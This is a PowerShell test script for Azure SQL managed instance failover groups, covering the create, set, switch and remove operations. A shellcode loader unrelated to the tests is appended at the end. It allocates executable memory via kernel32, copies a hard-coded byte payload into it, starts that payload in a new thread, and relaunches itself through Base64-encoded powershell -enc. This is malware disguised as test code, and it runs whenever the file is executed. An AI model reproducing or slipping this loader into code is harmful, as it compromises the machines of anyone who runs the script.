﻿













function Handle-InstanceFailoverGroupTest($scriptBlock, $rg = "testclrg", $primaryLocation = "southeastasia", $secondaryLocation = "southeastasia", $mi1 = $null, $mi2 = $null, $cleanup = $false)
{
	try
	{
		$rg = if ($rg -eq $null) { "testclrg" } else { $rg }
		$miName1 = if ($mi1 -eq $null) { "tdstage-haimb-dont-delete-3" } else { "" }
		$miName2 = if ($mi1 -eq $null) { "threat-detection-test-1" } else { "" }

		Invoke-Command -ScriptBlock $scriptBlock -ArgumentList $primaryLocation, $secondaryLocation, $rg, $miName1, $miName2
	}
	finally
	{	
	}
}

function Handle-InstanceFailoverGroupTestWithInstanceFailoverGroup($scriptBlock, $failoverPolicy = "Automatic")
{
	Handle-InstanceFailoverGroupTest {
		Param($location, $partnerRegion, $rg, $managedInstanceName, $partnerManagedInstanceName)

        $fgName = Get-FailoverGroupName
		$fg = New-AzSqlDatabaseInstanceFailoverGroup -Name $fgName -Location $location -ResourceGroupName $rg -PrimaryManagedInstanceName $managedInstanceName -PartnerRegion $partnerRegion -PartnerResourceGroupName $rg -PartnerManagedInstanceName $partnerManagedInstanceName
		Invoke-Command -ScriptBlock $scriptBlock -ArgumentList $fg
		
	}.GetNewClosure()
}

function Validate-InstanceFailoverGroup($rg, $name, $miName1, $miName2, $role, $partnerRole, $failoverPolicy, $gracePeriod, $readOnlyFailoverPolicy, $fg, $message="no context provided")
{	
	Assert-NotNull $fg.Id "`$fg.Id ($message)"
	Assert-NotNull $fg.PartnerRegion "`$fg.PartnerRegion ($message)"
	Assert-AreEqual $miName1 $fg.PrimaryManagedInstanceName "`$fg.PrimaryManagedInstanceName ($message)"
	Assert-AreEqual $miName2 $fg.PartnerManagedInstanceName "`$fg.PartnerManagedInstanceName ($message)"
	Assert-AreEqual $name $fg.Name "`$fg.Name ($message)"
	Assert-AreEqual $rg $fg.ResourceGroupName "`$fg.ResourceGroupName ($message)"
	Assert-AreEqual $rg $fg.PartnerResourceGroupName "`$fg.PartnerResourceGroupName ($message)"
	Assert-AreEqual $role $fg.ReplicationRole "`$fg.ReplicationRole ($message)"
	Assert-AreEqual $failoverPolicy $fg.ReadWriteFailoverPolicy "`$fg.ReadWriteFailoverPolicy ($message)"
	Assert-AreEqual $gracePeriod $fg.FailoverWithDataLossGracePeriodHours "`$fg.FailoverWithGracePeriodHours ($message)"
	Assert-AreEqual $readOnlyFailoverPolicy $fg.ReadOnlyFailoverPolicy "`$fg.ReadOnlyFailoverPolicy ($message)"
	Assert-AreEqual $true @('CATCH_UP', 'SUSPENDED', 'SEEDING').Contains($fg.ReplicationState) "`$fg.ReplicationState ($message)"
}

function Assert-InstanceFailoverGroupsEqual($expected, $actual, $role = $null, $failoverPolicy = $null, $gracePeriod = $null, $readOnlyFailoverPolicy = $null, $message = "no context provided")
{
	$failoverPolicy = if ($failoverPolicy -eq $null) { $expected.ReadWriteFailoverPolicy } else { $failoverPolicy }
	$gracePeriod = if ($gracePeriod -eq $null -and $failoverPolicy -ne "Manual") { $expected.FailoverWithDataLossGracePeriodHours } else { $gracePeriod }
	$readOnlyFailoverPolicy = if ($readOnlyFailoverPolicy -eq $null) { $expected.ReadOnlyFailoverPolicy } else { $readOnlyFailoverPolicy }
	$role = if ($role -eq $null) { $expected.ReplicationRole } else { $role }

	$partnerRole = if ($role -eq "Primary") { "Secondary" } else { "Primary" }

	Validate-InstanceFailoverGroup `
		$expected.ResourceGroupName `
		$expected.Name `
		$expected.PrimaryManagedInstanceName `
		$expected.PartnerManagedInstanceName `
		$role `
		$partnerRole `
		$failoverPolicy `
		$gracePeriod `
		$readOnlyFailoverPolicy `
		$actual `
		$message
}

function Validate-InstanceFailoverGroupWithGet($fg, $message = "no context provided")
{
	$actual = Get-AzSqlDatabaseInstanceFailoverGroup -ResourceGroupName $fg.ResourceGroupName -Location $fg.Location -Name $fg.Name
	Assert-InstanceFailoverGroupsEqual $fg $actual -message $message
}



function Test-CreateInstanceFailoverGroup-Named()
{
	Handle-InstanceFailoverGroupTest {
		Param($location, $partnerRegion, $rg, $managedInstanceName, $partnerManagedInstanceName)

        $fgName = Get-FailoverGroupName
		$fg = New-AzSqlDatabaseInstanceFailoverGroup -Name $fgName -Location $location -ResourceGroupName $rg -PrimaryManagedInstanceName $managedInstanceName -PartnerRegion $partnerRegion -PartnerResourceGroupName $rg -PartnerManagedInstanceName $partnerManagedInstanceName
		Validate-InstanceFailoverGroup $rg $fgName $managedInstanceName $partnerManagedInstanceName Primary Secondary Automatic 1 Disabled $fg
		Validate-InstanceFailoverGroupWithGet $fg

		Remove-AzSqlDatabaseInstanceFailoverGroup -Name $fgName -Location $location -ResourceGroupName $rg -Force
	}
}

function Test-CreateInstanceFailoverGroup-Positional()
{
	Handle-InstanceFailoverGroupTest {
		Param($location, $partnerRegion, $rg, $managedInstanceName, $partnerManagedInstanceName)

		$fgName = Get-FailoverGroupName
		$fg = New-AzSqlDatabaseInstanceFailoverGroup -ResourceGroupName $rg -PrimaryManagedInstanceName $managedInstanceName -Name $fgName -Location $location -PartnerRegion $partnerRegion -PartnerManagedInstanceName $partnerManagedInstanceName 
		Validate-InstanceFailoverGroup $rg $fgName $managedInstanceName $partnerManagedInstanceName Primary Secondary Automatic 1 Disabled $fg
		Validate-InstanceFailoverGroupWithGet $fg

		$fg | Remove-AzSqlDatabaseInstanceFailoverGroup -Force
	}
}

function Test-CreateInstanceFailoverGroup-AutomaticPolicy()
{
	Handle-InstanceFailoverGroupTest {
		Param($location, $partnerRegion, $rg, $managedInstanceName, $partnerManagedInstanceName)
		
        $fgName = Get-FailoverGroupName
		$fg = New-AzSqlDatabaseInstanceFailoverGroup -ResourceGroupName $rg -Location $location -PrimaryManagedInstanceName $managedInstanceName -Name $fgName -PartnerRegion $partnerRegion -PartnerManagedInstanceName $partnerManagedInstanceName -FailoverPolicy Automatic
		Validate-InstanceFailoverGroup $rg $fgName $managedInstanceName $partnerManagedInstanceName Primary Secondary Automatic 1 Disabled $fg
        Validate-InstanceFailoverGroupWithGet $fg

		$fg | Remove-AzSqlDatabaseInstanceFailoverGroup -Force
	}
}

function Test-CreateInstanceFailoverGroup-AutomaticPolicyGracePeriodReadOnlyFailover()
{
	Handle-InstanceFailoverGroupTest {
		Param($location, $partnerRegion, $rg, $managedInstanceName, $partnerManagedInstanceName)

        $fgName = Get-FailoverGroupName
		$fg = New-AzSqlDatabaseInstanceFailoverGroup -ResourceGroupName $rg -Location $location  -PrimaryManagedInstanceName $managedInstanceName -Name $fgName -PartnerRegion $partnerRegion -PartnerManagedInstanceName $partnerManagedInstanceName -FailoverPolicy Automatic -GracePeriodWithDataLossHours 123 -AllowReadOnlyFailoverToPrimary Enabled
		Validate-InstanceFailoverGroup $rg $fgName $managedInstanceName $partnerManagedInstanceName Primary Secondary Automatic 123 Enabled $fg
		Validate-InstanceFailoverGroupWithGet $fg

		$fg | Remove-AzSqlDatabaseInstanceFailoverGroup -Force
	}
}

function Test-CreateInstanceFailoverGroup-ManualPolicy()
{
	Handle-InstanceFailoverGroupTest {
		Param($location, $partnerRegion, $rg, $managedInstanceName, $partnerManagedInstanceName)

        $fgName = Get-FailoverGroupName
		$fg = New-AzSqlDatabaseInstanceFailoverGroup -ResourceGroupName $rg -Location $location  -PrimaryManagedInstanceName $managedInstanceName -Name $fgName -PartnerRegion $partnerRegion -PartnerManagedInstanceName $partnerManagedInstanceName -FailoverPolicy Manual 
        Validate-InstanceFailoverGroup $rg $fgName $managedInstanceName $partnerManagedInstanceName Primary Secondary Manual $null Disabled $fg
		Validate-InstanceFailoverGroupWithGet $fg

		$fg | Remove-AzSqlDatabaseInstanceFailoverGroup -Force
	}
}

function Test-SetInstanceFailoverGroup-Named()
{
	Handle-InstanceFailoverGroupTestWithInstanceFailoverGroup {
		Param($fg)

		$newFg = $fg | Set-AzSqlDatabaseInstanceFailoverGroup 
		Assert-InstanceFailoverGroupsEqual $fg $newFg
		Validate-InstanceFailoverGroupWithGet $newFg
		
		$newFg | Remove-AzSqlDatabaseInstanceFailoverGroup -Force
	}
}

function Test-SetInstanceFailoverGroup-Positional()
{
	Handle-InstanceFailoverGroupTestWithInstanceFailoverGroup {
		Param($fg)

		$newFg = $fg | Set-AzSqlDatabaseInstanceFailoverGroup
		Assert-InstanceFailoverGroupsEqual $fg $newFg
		Validate-InstanceFailoverGroupWithGet $newFg

		$newFg | Remove-AzSqlDatabaseInstanceFailoverGroup -Force
	}
}

function Test-SetInstanceFailoverGroup-AutomaticWithGracePeriodReadOnlyFailover()
{
	Handle-InstanceFailoverGroupTestWithInstanceFailoverGroup {
		Param($fg)

		$newFg = $fg | Set-AzSqlDatabaseInstanceFailoverGroup -FailoverPolicy Automatic -GracePeriodWithDataLossHours 123 -AllowReadOnlyFailoverToPrimary Enabled
		Assert-InstanceFailoverGroupsEqual $fg $newFg -failoverPolicy Automatic -gracePeriod 123 -readOnlyFailoverPolicy Enabled
		Validate-InstanceFailoverGroupWithGet $newFg

		$newFg | Remove-AzSqlDatabaseInstanceFailoverGroup -Force
	} -failoverPolicy Manual
}

function Test-SetInstanceFailoverGroup-AutomaticToManual()
{
	Handle-InstanceFailoverGroupTestWithInstanceFailoverGroup {
		Param($fg)

		$newFg = $fg | Set-AzSqlDatabaseInstanceFailoverGroup -FailoverPolicy Manual
		Assert-InstanceFailoverGroupsEqual $fg $newFg -failoverPolicy Manual -gracePeriod $null
		Validate-InstanceFailoverGroupWithGet $newFg

		$newFg | Remove-AzSqlDatabaseInstanceFailoverGroup -Force
	}
}

function Test-SetInstanceFailoverGroup-ManualToAutomaticNoGracePeriod()
{
	Handle-InstanceFailoverGroupTestWithInstanceFailoverGroup {
		Param($fg)

		$newFg = $fg | Set-AzSqlDatabaseInstanceFailoverGroup -FailoverPolicy Manual
		Assert-InstanceFailoverGroupsEqual $fg $newFg -failoverPolicy Manual -gracePeriod $null

		$newFg = $fg | Set-AzSqlDatabaseInstanceFailoverGroup -FailoverPolicy Automatic
		Assert-InstanceFailoverGroupsEqual $fg $newFg -failoverPolicy Automatic -gracePeriod 1
		Validate-InstanceFailoverGroupWithGet $newFg

		$newFg | Remove-AzSqlDatabaseInstanceFailoverGroup -Force
	} -failoverPolicy Manual
}

function Test-SwitchInstanceFailoverGroup()
{
	Handle-InstanceFailoverGroupTestWithInstanceFailoverGroup {
		Param($fg)

		$fg | Switch-AzSqlDatabaseInstanceFailoverGroup 

		$newPrimaryFg = Get-AzSqlDatabaseInstanceFailoverGroup -ResourceGroupName $fg.ResourceGroupName -Location $fg.Location -Name $fg.Name

		Validate-InstanceFailoverGroupWithGet $newPrimaryFg		

		$newPrimaryFg | Remove-AzSqlDatabaseInstanceFailoverGroup -Force
	}
}

function Test-SwitchInstanceFailoverGroupAllowDataLoss()
{
	Handle-InstanceFailoverGroupTestWithInstanceFailoverGroup {
		Param($fg)

		$fg | Switch-AzSqlDatabaseInstanceFailoverGroup -AllowDataLoss
		$newPrimaryFg = Get-AzSqlDatabaseInstanceFailoverGroup -ResourceGroupName $fg.ResourceGroupName -Location $fg.Location -Name $fg.Name

		Validate-InstanceFailoverGroupWithGet $newPrimaryFg

		$newPrimaryFg | Remove-AzSqlDatabaseInstanceFailoverGroup -Force
	}
}
$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x55,0xe8,0x4a,0x72,0xd9,0xcb,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x46,0x0f,0x03,0x46,0x5a,0x0a,0xbf,0x8e,0x8c,0x48,0x40,0x6f,0x4c,0x2d,0xc8,0x8a,0x7d,0x6d,0xae,0xdf,0x2d,0x5d,0xa4,0xb2,0xc1,0x16,0xe8,0x26,0x52,0x5a,0x25,0x48,0xd3,0xd1,0x13,0x67,0xe4,0x4a,0x67,0xe6,0x66,0x91,0xb4,0xc8,0x57,0x5a,0xc9,0x09,0x90,0x87,0x20,0x5b,0x49,0xc3,0x97,0x4c,0xfe,0x99,0x2b,0xe6,0x4c,0x0f,0x2c,0x1b,0x04,0x2e,0x1d,0x8a,0x1f,0x69,0xbd,0x2c,0xcc,0x01,0xf4,0x36,0x11,0x2f,0x4e,0xcc,0xe1,0xdb,0x51,0x04,0x38,0x23,0xfd,0x69,0xf5,0xd6,0xff,0xae,0x31,0x09,0x8a,0xc6,0x42,0xb4,0x8d,0x1c,0x39,0x62,0x1b,0x87,0x99,0xe1,0xbb,0x63,0x18,0x25,0x5d,0xe7,0x16,0x82,0x29,0xaf,0x3a,0x15,0xfd,0xdb,0x46,0x9e,0x00,0x0c,0xcf,0xe4,0x26,0x88,0x94,0xbf,0x47,0x89,0x70,0x11,0x77,0xc9,0xdb,0xce,0xdd,0x81,0xf1,0x1b,0x6c,0xc8,0x9d,0xe8,0x5d,0xf3,0x5d,0x67,0xd5,0x80,0x6f,0x28,0x4d,0x0f,0xc3,0xa1,0x4b,0xc8,0x24,0x98,0x2c,0x46,0xdb,0x23,0x4d,0x4e,0x1f,0x77,0x1d,0xf8,0xb6,0xf8,0xf6,0xf8,0x37,0x2d,0x62,0xfc,0xaf,0x95,0xc8,0x8e,0x2c,0x42,0x2d,0x6f,0x23,0xce,0xb8,0x89,0x13,0xbe,0xea,0x05,0xd3,0x6e,0x4b,0xf6,0xbb,0x64,0x44,0x29,0xdb,0x86,0x8e,0x42,0x71,0x69,0x67,0x3a,0xed,0x10,0x22,0xb0,0x8c,0xdd,0xf8,0xbc,0x8e,0x56,0x0f,0x40,0x40,0x9f,0x7a,0x52,0x34,0x6f,0x31,0x08,0x92,0x70,0xef,0x27,0x1a,0xe5,0x14,0xee,0x4d,0x91,0x16,0xd7,0xb9,0x3e,0xe8,0x32,0xb2,0xf7,0x7c,0xfd,0xac,0xf7,0x90,0xfd,0x2c,0xae,0xfa,0xfd,0x44,0x16,0x5f,0xae,0x71,0x59,0x4a,0xc2,0x2a,0xcc,0x75,0xb3,0x9f,0x47,0x1e,0x39,0xc6,0xa0,0x81,0xc2,0x2d,0x31,0xfd,0x14,0x0b,0x47,0xef,0xa4;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}

